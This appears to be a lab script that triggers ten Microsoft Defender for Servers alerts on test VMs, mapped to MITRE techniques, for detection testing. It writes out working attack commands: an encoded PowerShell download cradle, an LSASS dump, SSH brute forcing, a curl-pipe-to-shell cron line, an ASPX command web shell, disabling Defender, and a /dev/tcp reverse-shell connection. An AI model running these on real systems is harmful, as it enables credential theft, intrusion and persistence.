#!/usr/bin/env bash
# Defender for Servers — scenarios S-SRV-01..10
# Invoke remote commands on the lab VMs via 'az vm run-command'.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/lib/common.sh"
confirm_safe

# Scenario: 01 — EICAR test file (Windows + Linux)         [T1204]
s01() {
  scenario_header S-SRV-01 "EICAR test file" T1204
  info "Dropping EICAR on Linux VM"
  run_on_vm "$LIN_VM" "$RG_SERVERS" \
    "echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*' > /tmp/eicar.com; ls -la /tmp/eicar.com"
  info "Dropping EICAR on Windows VM"
  run_on_winvm "$WIN_VM" "$RG_SERVERS" \
    "New-Item C:\\temp -ItemType Directory -Force | Out-Null; \$e='X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*'; \$e | Out-File -Encoding ASCII C:\\temp\\eicar.com; Get-Item C:\\temp\\eicar.com"
  ok "EICAR dropped. AV should quarantine within minutes."
}

# Scenario: 02 — Encoded PowerShell                         [T1059.001/T1027]
s02() {
  scenario_header S-SRV-02 "Encoded PowerShell download cradle" T1059.001
  run_on_winvm "$WIN_VM" "$RG_SERVERS" \
    '$cmd = "IEX (New-Object Net.WebClient).DownloadString(''http://example.com/x'')"; $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); Start-Process powershell.exe -ArgumentList "-NoProfile -enc $b64" -WindowStyle Hidden | Out-Null; "queued encoded ps"'
  ok "Encoded PS started."
}

# Scenario: 03 — LSASS dump (ProcDump)                      [T1003.001]
s03() {
  scenario_header S-SRV-03 "LSASS dump via ProcDump" T1003.001
  run_on_winvm "$WIN_VM" "$RG_SERVERS" '
    New-Item C:\temp -ItemType Directory -Force | Out-Null;
    if (-not (Test-Path C:\temp\procdump.exe)) {
      Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile C:\temp\pd.zip;
      Expand-Archive C:\temp\pd.zip -DestinationPath C:\temp\ -Force;
    }
    Start-Process C:\temp\procdump.exe -ArgumentList "-accepteula -ma lsass.exe C:\temp\lsass.dmp" -Wait;
    Get-Item C:\temp\lsass.dmp;'
  warn "Cleanup will remove the dump:"
  run_on_winvm "$WIN_VM" "$RG_SERVERS" 'Remove-Item C:\temp\lsass.dmp -Force -ErrorAction SilentlyContinue'
  ok "LSASS access generated."
}

# Scenario: 04 — SSH brute force                            [T1110]
s04() {
  scenario_header S-SRV-04 "SSH brute force" T1110
  local target
  target=$(az vm list-ip-addresses -g "$RG_SERVERS" -n "$LIN_VM" --query "[0].virtualMachine.network.publicIpAddresses[0].ipAddress" -o tsv)
  if ! have hydra; then
    warn "hydra not on local PATH — running a small for-loop with ssh keyboard-interactive."
    for p in pass1 pass2 letmein qwerty admin123 password1 root1234 toor; do
      sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@"$target" exit 2>/dev/null || true
    done
  else
    hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 -f "ssh://$target" || true
  fi
  ok "Brute force attempted against $target."
}

# Scenario: 05 — Crypto-miner indicator                     [T1496]
s05() {
  scenario_header S-SRV-05 "Crypto-miner placeholder + pool DNS" T1496
  run_on_vm "$LIN_VM" "$RG_SERVERS" "touch /tmp/xmrig && nslookup pool.minexmr.com | head -5"
  ok "Indicator generated."
  run_on_vm "$LIN_VM" "$RG_SERVERS" "rm -f /tmp/xmrig"
}

# Scenario: 06 — Suspicious download-and-execute            [T1105/T1059.004]
s06() {
  scenario_header S-SRV-06 "Suspicious curl|chmod|exec chain" T1105
  run_on_vm "$LIN_VM" "$RG_SERVERS" \
    "curl -fsSL https://example.com -o /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh; rm -f /tmp/p.sh"
  ok "Download-execute pattern generated."
}

# Scenario: 07 — IIS web shell drop                         [T1505.003]
s07() {
  scenario_header S-SRV-07 "Drop diag.aspx web shell" T1505.003
  run_on_winvm "$WIN_VM" "$RG_SERVERS" '
    if (-not (Test-Path C:\inetpub\wwwroot)) { New-Item -ItemType Directory -Force C:\inetpub\wwwroot | Out-Null }
    "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"c\"]).Id); %>" | Out-File -Encoding ASCII C:\inetpub\wwwroot\diag.aspx;
    Get-Item C:\inetpub\wwwroot\diag.aspx;'
  warn "Removing shell"
  run_on_winvm "$WIN_VM" "$RG_SERVERS" 'Remove-Item C:\inetpub\wwwroot\diag.aspx -Force -ErrorAction SilentlyContinue'
  ok "Web shell artefact created and removed."
}

# Scenario: 08 — Cron persistence                           [T1053.003]
s08() {
  scenario_header S-SRV-08 "Cron-based persistence" T1053.003
  run_on_vm "$LIN_VM" "$RG_SERVERS" \
    "echo '* * * * * root curl -fsSL http://example.com/x | sh' | sudo tee -a /etc/crontab >/dev/null; tail -2 /etc/crontab"
  warn "Reverting /etc/crontab"
  run_on_vm "$LIN_VM" "$RG_SERVERS" \
    "sudo sed -i '/curl -fsSL http:\\/\\/example.com\\/x | sh/d' /etc/crontab; tail -2 /etc/crontab"
  ok "Persistence line added & removed."
}

# Scenario: 09 — Disable Defender real-time protection      [T1562.001]
s09() {
  scenario_header S-SRV-09 "Disable Defender RTP" T1562.001
  run_on_winvm "$WIN_VM" "$RG_SERVERS" \
    'Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep 5; Get-MpPreference | Select-Object DisableRealtimeMonitoring; Set-MpPreference -DisableRealtimeMonitoring $false'
  ok "RTP toggled off and back on."
}

# Scenario: 10 — Reverse shell                              [T1059.004]
s10() {
  scenario_header S-SRV-10 "Reverse shell (simulated via /dev/tcp open)" T1059.004
  # Open a /dev/tcp pseudo-connection to a non-existent listener to surface the syscall pattern.
  run_on_vm "$LIN_VM" "$RG_SERVERS" \
    'timeout 5 bash -c "exec 3<>/dev/tcp/198.51.100.1/4444 && echo open && cat <&3" || echo "connection-attempt-finished"'
  ok "Reverse-shell behaviour generated."
}

dispatch "${1:?scenario number required (01..10)}"
